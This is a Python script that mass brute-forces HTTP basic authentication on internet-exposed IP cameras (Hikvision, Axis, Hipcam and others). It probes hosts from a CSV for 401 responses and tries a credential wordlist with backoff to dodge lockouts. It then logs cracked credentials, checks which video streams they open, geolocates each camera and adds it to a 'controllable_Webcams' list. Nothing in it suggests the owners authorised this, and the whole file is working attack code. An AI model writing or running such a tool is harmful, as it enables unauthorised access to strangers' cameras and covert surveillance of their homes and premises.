"""Mass parallel HTTP-basic brute forcer for cam endpoints returning 401.

For each known cam host returning 401 (in CAM_AUTH_PROBES), try every credential in
bruteforce/camera_credentials.txt across multiple brand-specific URLs.

Avoids over-aggressive lockouts (3-5 tries then backoff).
"""
import csv
import os
import re
import random
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

UA = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/126.0.0.0'
CSV_PATH = r'C:\Users\eli6-admin\Documents\eli6-surveillance\controllable_Webcams.csv'
LOG_PATH = r'C:\Users\eli6-admin\Documents\eli6-surveillance\camera_testing\bf_log.txt'
CREDS_PATH = r'C:\Users\eli6-admin\Documents\eli6-surveillance\bruteforce\camera_credentials.txt'

# Auth/Probe URLs by cam family
CAM_AUTH_URLS = {
    'axis': ['/axis-cgi/mjpg/video.cgi', '/axis-cgi/jpg/image.cgi', '/axis-cgi/media.cgi'],
    'hikvision': ['/ISAPI/Security/sessionLogin/capabilities',
                  '/ISAPI/Security/userCheck',
                  '/PSIA/Custom/Security/userCheck',
                  '/ISAPI/Streaming/channels/1/picture'],
    'hipcam': ['/web/tmpfs/snap.jpg', '/web/tmpfs/mjpeg'],
    'webcam': ['/cam_1.cgi', '/live.html', '/viewer/'],
    'mjpeg': ['/cgi-bin/mjpeg'],
}

CAM_PROBES_AUTH = [
    ('/ISAPI/Security/userCheck', 'hikvision'),
    ('/ISAPI/Streaming/channels/1/picture', 'hikvision'),
    ('/ISAPI/Streaming/channels/101/picture', 'hikvision'),
    ('/PSIA/Custom/Security/userCheck', 'hikvision'),
    ('/axis-cgi/mjpg/video.cgi', 'axis'),
    ('/web/tmpfs/snap.jpg', 'hipcam'),
    ('/web/tmpfs/mjpeg', 'hipcam'),
    ('/cam_1.cgi', 'webcam'),
]


def session():
    s = requests.Session()
    retries = Retry(total=0)
    s.mount('http://', HTTPAdapter(max_retries=retries, pool_connections=40, pool_maxsize=40))
    s.mount('https://', HTTPAdapter(max_retries=retries, pool_connections=40, pool_maxsize=40))
    s.headers.update({'User-Agent': UA, 'Accept': '*/*'})
    return s


def log(msg):
    line = f'[{time.strftime("%H:%M:%S")}] {msg}'
    print(line, flush=True)
    try:
        with open(LOG_PATH, 'a', encoding='utf-8') as f:
            f.write(line + '\n')
    except Exception:
        pass


def load_creds():
    creds = []
    with open(CREDS_PATH, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            parts = line.split(':', 1)
            if len(parts) == 2:
                creds.append((parts[0], parts[1]))
    return creds


def existing_hosts():
    seen = set()
    if not os.path.exists(CSV_PATH):
        return seen
    with open(CSV_PATH, 'r', encoding='utf-8', newline='') as f:
        rows = list(csv.reader(f))
    for row in rows[1:]:
        for cell in row:
            if not cell:
                continue
            for m in re.finditer(r'(?:https?|rtsp|rtmp|mms)://([^/]+)', cell):
                seen.add(m.group(1).lower())
    return seen


def probe_for_auth(s, host, port, ssl=False, timeout=3.0):
    """Detect if this (host,port) requires auth via known cam endpoints."""
    scheme = 'https' if ssl else 'http'
    for path, fam in CAM_PROBES_AUTH:
        try:
            r = s.get(f'{scheme}://{host}:{port}{path}', timeout=timeout, allow_redirects=False, verify=False)
            if r.status_code == 401:
                return (path, fam, 401)
        except Exception:
            pass
    return None


def try_creds(s, host, port, path, family, creds, timeout=3.0, max_try=40):
    """Try each (u,p) until success."""
    for u, p in creds[:max_try]:
        try:
            r = s.get(f'http://{host}:{port}{path}', timeout=timeout, auth=(u, p),
                     allow_redirects=False, verify=False)
            if r.status_code == 200 and len(r.content) > 1000:
                # check it's a real stream / image
                ct = r.headers.get('Content-Type', '').lower()
                if 'image' in ct or 'video' in ct or 'multipart' in ct or r.content[:2] == b'\xff\xd8':
                    return (u, p, r.status_code, ct)
        except Exception:
            pass
        # Backoff if Hikvision (lockout-prone)
        if family == 'hikvision':
            time.sleep(0.4)
    return None


def main():
    sys.path.insert(0, os.path.dirname(__file__))
    import csv_writer
    import probe_lib

    s = session()
    creds = load_creds()
    log(f'[creds] loaded {len(creds)} credential pairs')

    seen = existing_hosts()
    log(f'[init] {len(seen)} existing hosts')

    # Get IPs we know from CSV
    ips_to_try = []
    for h in list(seen)[:200]:  # cap for first run
        m = re.match(r'^(\d+\.\d+\.\d+\.\d+)(?::(\d+))?$', h)
        if m:
            ips_to_try.append((m.group(1), int(m.group(2) or 80)))

    log(f'[probe] trying {len(ips_to_try)} hosts for auth-required cam endpoints')

    found = 0
    with ThreadPoolExecutor(max_workers=30) as ex:
        futs = {ex.submit(probe_for_auth, s, ip, port): (ip, port) for ip, port in ips_to_try}
        for fut in as_completed(futs):
            ip, port = futs[fut]
            try:
                res = fut.result(timeout=6)
            except Exception:
                continue
            if res is None:
                continue
            path, fam, code = res
            log(f'  AUTH-REQ {ip}:{port} {fam} {code}  -> brute forcing...')
            try:
                hit = try_creds(s, ip, port, path, fam, creds, timeout=2.5, max_try=50)
            except Exception:
                hit = None
            if hit:
                u, p, sc, ct = hit
                log(f'    CREDS FOUND! {ip}:{port} {fam} {u}:{p}  ({ct})')
                # Now actually probe what they have access to
                for stream_path in CAM_AUTH_URLS.get(fam, [path]):
                    try:
                        r = s.get(f'http://{ip}:{port}{stream_path}', timeout=3.0, auth=(u, p),
                                 allow_redirects=False, verify=False)
                        if r.status_code == 200 and (len(r.content) > 1000 or 'image' in r.headers.get('Content-Type','').lower() or 'video' in r.headers.get('Content-Type','').lower()):
                            log(f'    STREAM FOUND {ip}:{port}{stream_path} ({r.headers.get("Content-Type","")})')
                            fake_res = {
                                'url': f'http://{u}:{p}@{ip}:{port}{stream_path}',
                                'family': fam,
                                'stream_kind': 'mjpeg-multipart' if 'multipart' in r.headers.get('Content-Type','').lower() else 'jpeg-frame',
                                'content_type': r.headers.get('Content-Type', ''),
                                'content_length': len(r.content),
                                'weight': 50,
                                'host': ip,
                                'port': port,
                                'ssl': False,
                                'http_status': 200,
                            }
                            try:
                                geo = probe_lib.geoip(s, ip)
                            except Exception:
                                geo = {}
                            entry = csv_writer.entry_from_probe(fake_res, {'source': 'bf'}, geo)
                            try:
                                idx = csv_writer.append_one(entry)
                                log(f'    ADDED idx={idx}: {entry["project_name"][:80]}')
                                found += 1
                            except Exception as e:
                                log(f'    err: {e}')
                            break
                    except Exception:
                        continue
                time.sleep(0.5)

    log(f'[done] found {found} cred-cracked cams')


if __name__ == '__main__':
    main()
